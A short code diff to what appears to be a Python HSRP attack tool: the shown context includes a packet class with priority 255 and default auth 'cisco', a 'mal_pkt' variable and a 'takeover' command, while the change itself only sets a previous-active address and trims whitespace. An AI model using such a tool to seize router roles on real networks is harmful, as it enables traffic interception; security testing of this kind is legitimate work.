@@ -39,7 +39,7 @@ class Packet:
     port = 1985
     multicast_ip = '224.0.0.2' 
     auth = 'cisco'
-    prev_active = '0.0.0.0'
+    prev_active = '10.10.3.2'
     src_ip = '10.10.3.20'
     virtual_ip = '10.10.3.1'
     priority = 255
@@ -131,7 +131,7 @@ def hsrp_v1(pkt):
 def main():
     arg = args()
     mal_pkt = Packet()
-    
+
     if arg.sniff:
         sniff_network()
     elif arg.command == 'takeover':
